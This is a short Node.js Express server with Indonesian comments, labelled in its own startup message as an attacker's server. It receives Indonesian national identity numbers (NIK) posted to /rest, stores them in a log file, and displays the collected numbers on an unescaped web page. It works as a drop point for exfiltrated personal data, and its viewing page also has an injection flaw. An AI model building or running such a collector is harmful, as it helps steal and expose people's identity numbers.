const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware untuk parse JSON body
app.use(bodyParser.json());

// Endpoint untuk menerima data
app.post('/rest', (req, res) => {
    const { nik } = req.body; // Ambil data NIK dari body request

    if (nik) {
        // Simpan NIK yang diterima ke file log
        fs.appendFile('nik_log.txt', `NIK yang diterima: ${nik}\n`, (err) => {
            if (err) {
                console.log('Error menyimpan data:', err);
            }
        });

        res.send('Data diterima');
    } else {
        res.status(400).send('Tidak ada data NIK');
    }
});

// Endpoint untuk menampilkan data NIK yang diterima
app.get('/view-nik', (req, res) => {
    // Membaca file log yang berisi data NIK
    fs.readFile('nik_log.txt', 'utf8', (err, data) => {
        if (err) {
            res.status(500).send('Gagal membaca data');
        } else {
            // Menampilkan data NIK di browser
            res.send(`<pre>${data}</pre>`);
        }
    });
});

// Jalankan server
app.listen(port, () => {
    console.log(`Server penyerang berjalan di http://localhost:${port}`);
});
